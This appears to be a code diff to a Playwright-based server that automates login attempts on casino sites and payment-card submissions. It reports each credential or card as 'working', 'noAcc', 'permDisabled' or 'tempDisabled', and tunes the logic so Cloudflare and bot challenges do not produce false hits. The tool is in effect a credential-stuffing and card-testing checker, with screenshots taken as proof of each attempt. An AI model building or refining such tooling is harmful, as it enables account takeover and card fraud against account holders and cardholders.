@@ -53,14 +53,40 @@ const POST_SUBMIT_WAIT = 3000;
 // ── Helpers ──────────────────────────────────────────────────────────────────
 
 /**
- * Captures a full-page screenshot from a Playwright page and returns it as
- * a base64-encoded PNG data URL suitable for embedding in <img> src attributes.
+ * Captures a viewport screenshot from a Playwright page and returns it as a
+ * base64-encoded PNG data URL. Injects a "SCR X/4" badge into the top-right
+ * corner of the live page before screenshotting so the label is burned into
+ * the real browser image, then removes the badge afterwards.
+ *
  * @param {import('playwright').Page} page - The Playwright page to capture.
+ * @param {string} [label] - Optional label to burn in, e.g. 'SCR 1/4'.
  * @returns {Promise<string>} Data URL string (data:image/png;base64,...).
  */
-async function captureShot(page) {
+async function captureShot(page, label) {
+  const BADGE_ID = '_sitcho_scr_badge';
   try {
+    if (label) {
+      await page.evaluate(([id, text]) => {
+        const existing = document.getElementById(id);
+        if (existing) existing.remove();
+        const el = document.createElement('div');
+        el.id = id;
+        el.style.cssText = [
+          'position:fixed', 'top:12px', 'right:12px',
+          'background:rgba(0,0,0,0.72)', 'color:#fff',
+          'font-size:13px', 'font-weight:700', 'letter-spacing:0.5px',
+          'padding:4px 11px', 'border-radius:6px', 'z-index:2147483647',
+          'font-family:ui-monospace,monospace', 'pointer-events:none',
+          'box-shadow:0 2px 8px rgba(0,0,0,0.5)',
+        ].join(';');
+        el.textContent = text;
+        document.body.appendChild(el);
+      }, [BADGE_ID, label]).catch(() => {});
+    }
     const buf = await page.screenshot({ fullPage: false, type: 'png' });
+    if (label) {
+      await page.evaluate((id) => { document.getElementById(id)?.remove(); }, BADGE_ID).catch(() => {});
+    }
     return `data:image/png;base64,${buf.toString('base64')}`;
   } catch {
     return '';
@@ -158,49 +184,78 @@ async function clickSubmit(page) {
 
 /**
  * Analyses the page content after a login attempt to determine the outcome.
- * Looks for success indicators (dashboard, account, logged-in elements) and
- * failure indicators (error messages, disabled account notices).
+ *
+ * Strategy (strict — avoids false positives from Cloudflare/anti-bot redirects):
+ *  1. Check for hard failure text first (disabled, locked, invalid creds).
+ *  2. Only call "working" when MULTIPLE strong success signals are present
+ *     (URL path change to account area AND success body text), or when a
+ *     high-confidence success keyword appears in the page text.
+ *  3. A bare URL redirect is NOT sufficient for "working" — casino sites
+ *     redirect to Cloudflare challenges or error pages on every bad login.
+ *
  * @param {import('playwright').Page} page - The Playwright page after form submission.
- * @param {string} loginUrl - The original login URL (used for redirect comparison).
- * @returns {Promise<{outcome: string, note: string}>} Outcome code and human-readable note.
+ * @param {string} loginUrl - The original login URL.
+ * @returns {Promise<{outcome: string, note: string}>}
  */
 async function determineLoginOutcome(page, loginUrl) {
-  const url = page.url();
+  const url = page.url().toLowerCase();
   const bodyText = (await page.textContent('body').catch(() => '')).toLowerCase();
 
-  // Check for success indicators
-  const successPatterns = [
-    /dashboard/i, /my.?account/i, /welcome/i, /deposit/i, /withdraw/i,
-    /lobby/i, /cashier/i, /balance/i, /logged.?in/i, /profile/i,
-  ];
-  const isRedirected = !url.includes(new URL(loginUrl).hostname) || url !== loginUrl;
-  const hasSuccessText = successPatterns.some(p => p.test(bodyText));
-
-  if (isRedirected || hasSuccessText) {
-    return { outcome: 'working', note: 'Login successful — redirected to account area' };
-  }
-
-  // Check for specific failure reasons
-  if (/account.*disabled|disabled.*account|account.*suspended|suspended/i.test(bodyText)) {
+  // ── Hard failure signals (check first) ──────────────────────────────────
+  if (/account.*disabled|disabled.*account|account.*suspended|permanently.*suspended/i.test(bodyText)) {
     return { outcome: 'permDisabled', note: 'Account is permanently disabled or suspended' };
   }
-  if (/temporarily.*blocked|too many.*attempt|locked.*out|try again later/i.test(bodyText)) {
+  if (/temporarily.*blocked|too many.*attempt|locked.*out|try again later|rate.?limit/i.test(bodyText)) {
     return { outcome: 'tempDisabled', note: 'Account temporarily locked — too many attempts' };
   }
-  if (/email.*not.*found|account.*not.*found|user.*not.*found|no account/i.test(bodyText)) {
+  if (/email.*not.*found|account.*not.*found|user.*not.*found|no account.*found/i.test(bodyText)) {
     return { outcome: 'noAcc', note: 'No account found for this email' };
   }
   if (/invalid.*password|incorrect.*password|wrong.*password|password.*incorrect/i.test(bodyText)) {
     return { outcome: 'noAcc', note: 'Invalid password' };
   }
-  if (/invalid.*credentials|incorrect.*credentials|login.*failed|sign.?in.*failed/i.test(bodyText)) {
+  if (/invalid.*credential|incorrect.*credential|login.*failed|sign.?in.*failed/i.test(bodyText)) {
     return { outcome: 'noAcc', note: 'Invalid credentials' };
   }
-  if (/error|invalid|incorrect|failed/i.test(bodyText)) {
-    return { outcome: 'noAcc', note: 'Login failed — credentials rejected' };
+  if (/your account.*banned|account.*banned|banned.*account/i.test(bodyText)) {
+    return { outcome: 'permDisabled', note: 'Account banned' };
   }
 
-  return { outcome: 'noAcc', note: 'Login did not succeed — page unchanged' };
+  // ── Strong success signals ───────────────────────────────────────────────
+  // High-confidence: URL moved to an account/game area (not just /login or / )
+  const loginHostname = new URL(loginUrl).hostname.toLowerCase();
+  const urlPath = (() => { try { return new URL(page.url()).pathname.toLowerCase(); } catch { return ''; } })();
+  const successUrlPaths = ['/account', '/dashboard', '/cashier', '/lobby', '/deposit', '/withdraw', '/profile', '/my-account', '/game'];
+  const urlIndicatesSuccess = successUrlPaths.some(p => urlPath.startsWith(p));
+
+  // High-confidence body text (specific casino post-login page content)
+  const strongSuccessPatterns = [
+    /my account/i, /account balance/i, /your balance/i, /\$[\d,]+\.\d{2}/,
+    /make a deposit/i, /cashier/i, /account overview/i, /welcome back/i,
+    /logout/i, /log out/i, /sign out/i, /deposit now/i, /withdrawal/i,
+  ];
+  const hasStrongSuccessText = strongSuccessPatterns.some(p => p.test(bodyText));
+
+  // Soft success: moderate indicators — only count if URL also changed to account area
+  const softSuccessPatterns = [/dashboard/i, /lobby/i, /balance/i, /profile/i];
+  const hasSoftSuccessText = softSuccessPatterns.some(p => p.test(bodyText));
+
+  if (hasStrongSuccessText && !url.includes('/login') && !url.includes('/sign-in')) {
+    return { outcome: 'working', note: 'Login successful — account area detected' };
+  }
+  if (urlIndicatesSuccess && hasSoftSuccessText) {
+    return { outcome: 'working', note: `Login successful — redirected to ${urlPath}` };
+  }
+
+  // ── Catch-all failure signals ────────────────────────────────────────────
+  if (/cloudflare|captcha|bot.*detected|access denied|403 forbidden|429 too many/i.test(bodyText)) {
+    return { outcome: 'noAcc', note: 'Bot/Cloudflare challenge — unable to verify' };
+  }
+  if (/error|invalid|incorrect|failed/i.test(bodyText)) {
+    return { outcome: 'noAcc', note: 'Login failed — check screenshots for details' };
+  }
+
+  return { outcome: 'noAcc', note: 'Login result unclear — review screenshots' };
 }
 
 /**
@@ -378,18 +433,17 @@ app.post('/api/login-check', async (req, res) => {
     }
 
     // Shot 1: form filled, ready to submit
-    shots[0] = await captureShot(page);
+    shots[0] = await captureShot(page, 'SCR 1/4');
 
     // Click submit
     const clicked = await clickSubmit(page);
     if (!clicked && filled) {
-      // Try pressing Enter if no submit button found
       await page.keyboard.press('Enter');
     }
 
     // Shot 2: immediately after submit (first response)
     await page.waitForTimeout(1500);
-    shots[1] = await captureShot(page);
+    shots[1] = await captureShot(page, 'SCR 2/4');
 
     // Wait for page to settle
     try {
@@ -400,7 +454,7 @@ app.post('/api/login-check', async (req, res) => {
     await page.waitForTimeout(1500);
 
     // Shot 3: after page settled
-    shots[2] = await captureShot(page);
+    shots[2] = await captureShot(page, 'SCR 3/4');
 
     // Determine outcome
     const result = await determineLoginOutcome(page, loginUrl);
@@ -408,7 +462,7 @@ app.post('/api/login-check', async (req, res) => {
     note = result.note;
 
     // Shot 4: final state
-    shots[3] = await captureShot(page);
+    shots[3] = await captureShot(page, 'SCR 4/4');
 
   } catch (err) {
     note = `Automation error: ${err.message}`;
@@ -469,7 +523,7 @@ app.post('/api/card-check', async (req, res) => {
     await page.waitForTimeout(2000);
 
     // Shot 1: page loaded, form visible
-    shots[0] = await captureShot(page);
+    shots[0] = await captureShot(page, 'SCR 1/4');
 
     // Fill card form
     const filled = await fillCardForm(page, number, mm, yy, cvv);
@@ -478,7 +532,7 @@ app.post('/api/card-check', async (req, res) => {
     }
 
     // Shot 2: form filled with card details
-    shots[1] = await captureShot(page);
+    shots[1] = await captureShot(page, 'SCR 2/4');
 
     // Submit
     const clicked = await clickSubmit(page);
@@ -494,7 +548,7 @@ app.post('/api/card-check', async (req, res) => {
     await page.waitForTimeout(1000);
 
     // Shot 3: first response after submit
-    shots[2] = await captureShot(page);
+    shots[2] = await captureShot(page, 'SCR 3/4');
 
     // Determine outcome
     const result = await determineCardOutcome(page);
@@ -502,7 +556,7 @@ app.post('/api/card-check', async (req, res) => {
     note = result.note;
 
     // Shot 4: final state
-    shots[3] = await captureShot(page);
+    shots[3] = await captureShot(page, 'SCR 4/4');
 
   } catch (err) {
     note = `Automation error: ${err.message}`;
